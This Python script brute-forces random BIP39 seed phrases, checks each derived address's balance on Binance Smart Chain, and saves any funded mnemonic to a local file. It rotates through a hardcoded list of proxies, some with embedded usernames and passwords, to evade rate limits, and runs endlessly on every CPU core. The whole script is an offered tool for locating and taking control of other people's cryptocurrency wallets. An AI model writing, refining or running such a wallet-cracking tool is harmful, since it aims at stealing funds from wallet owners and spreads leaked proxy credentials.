import os
import random
from web3 import Web3
from eth_account import Account
from mnemonic import Mnemonic
from multiprocessing import Pool, cpu_count
import requests
import time

# Activate the Mnemonic feature of the eth_account library
Account.enable_unaudited_hdwallet_features()
print("Mnemonic feature has been activated.")

# Function to parse proxy from the provided string
def parse_proxy(proxy_string):
    proxy_parts = proxy_string.strip().split(':')
    if len(proxy_parts) == 4:
        return {'http': f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"}
    elif len(proxy_parts) == 2:
        return {'http': f"http://{proxy_parts[0]}:{proxy_parts[1]}"}
    else:
        return None

# Read proxy list from the provided string
proxies_list = """
43.245.116.88:6603:nuwuqhwp:28qoul6qb9kw
104.143.252.57:5671:nuwuqhwp:28qoul6qb9kw
173.0.10.63:6239:nuwuqhwp:28qoul6qb9kw
98.159.38.252:6552:nuwuqhwp:28qoul6qb9kw
166.88.224.211:6109:nuwuqhwp:28qoul6qb9kw
38.154.194.214:9627:nuwuqhwp:28qoul6qb9kw
134.73.65.65:6617:nuwuqhwp:28qoul6qb9kw
142.147.132.235:6430:nuwuqhwp:28qoul6qb9kw
161.123.101.234:6860:nuwuqhwp:28qoul6qb9kw
31.146.84.142:61669
94.23.222.122:38251
51.75.71.110:24430
178.128.82.105:39993
128.199.183.41:25726
51.15.241.5:16379
213.136.78.200:49420
194.163.137.106:9050
144.91.68.111:46896
176.114.130.149:1080
51.15.139.15:16379
154.12.178.107:29985
163.172.144.132:16379
194.44.208.62:80
171.244.10.204:7520
139.162.238.184:52410
104.36.166.42:63572
165.227.196.37:54266
212.3.112.128:35860
207.180.198.241:39278
62.171.131.101:1385
"""

# Convert proxy list string to list of proxies
proxies = list(filter(None, [parse_proxy(proxy) for proxy in proxies_list.split('\n')]))

# Function to select a random proxy from the list
def select_random_proxy():
    return random.choice(proxies)

# Connect to the Binance Smart Chain
def connect_to_bsc():
    bsc = "https://bsc-dataseed.binance.org/"
    session = requests.Session()
    while True:
        try:
            selected_proxy = select_random_proxy()
            session.proxies = selected_proxy
            web3 = Web3(Web3.HTTPProvider(bsc, session=session))
            print("Connecting to Binance Smart Chain...")
            assert web3.is_connected(), "Failed to connect to Binance Smart Chain"
            print("Connected to Binance Smart Chain successfully.")
            return web3
        except Exception as e:
            print(f"Error connecting to Binance Smart Chain with proxy {selected_proxy}: {e}")
            print("Waiting 1 minute before trying again...")
            time.sleep(60)  # Chờ 1 phút trước khi thử lại kết nối

web3 = connect_to_bsc()

# Function to get wallet address from seed
def get_address_from_seed(seed):
    acct = Account.from_mnemonic(seed)
    return acct.address

# Function to check BNB balance and save to file if not zero
def check_balance_and_save(seed):
    address = get_address_from_seed(seed)
    balance = web3.eth.get_balance(address)
    balance_bnb = web3.from_wei(balance, 'ether')
    if balance_bnb > 0:
        with open(mnemonic_file_path, 'a+') as file:
            file.write(f'Mnemonic: {seed} - Address: {address} - Balance: {balance_bnb}\n')
            print(f"Saved mnemonic with balance: {balance_bnb} BNB to file.")
    else:
        print(f"Address {address} has a balance of 0 BNB.")

# Get absolute file path of mnemonic.txt in the same directory as the script
mnemonic_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'mnemonic.txt')

# Constants for the brute force
WORDLIST_SIZE = 2048  # Number of words in the BIP39 wordlist
MISSING_WORDS = 12    # Number of words to brute force

# Get the BIP39 English wordlist
mnemo = Mnemonic("english")
wordlist = mnemo.wordlist
print("Retrieved wordlist from BIP39.")

# Function to generate mnemonic
def generate_mnemonic():
    missing_words = random.sample(wordlist, MISSING_WORDS)
    return " ".join(missing_words)

# Function to perform the brute force
def brute_force(_):
    while True:
        mnemonic = generate_mnemonic()
        try:
            if mnemo.check(mnemonic):
                check_balance_and_save(mnemonic)
            break  # Thoát khỏi vòng lặp nếu không có lỗi
        except Exception as e:
            print(f"An error occurred: {e}")
            if "403 Client Error: Forbidden" in str(e):
                print("Waiting 1 minute before trying again...")
                time.sleep(60)  # Chờ 1 phút trước khi thử lại
            else:
                break  # Thoát khỏi vòng lặp nếu lỗi không phải là 403 Forbidden

if __name__ == '__main__':
    # Create a multiprocessing Pool
    pool = Pool(cpu_count())

    while True:  # Thực hiện vô hạn
        try:
            # Thực hiện brute force
            pool.map(brute_force, range(10000))  # Số lượng attempts có thể thay đổi tùy ý
        except KeyboardInterrupt:
            print("Dừng chương trình vô hạn.")
            break  # Dừng chương trình khi người dùng nhấn Ctrl+C

    # Đóng pool
    pool.close()
    pool.join()

    print("Chương trình của bạn đã thực thi xong.")
    input("Nhấn Enter để thoát...")
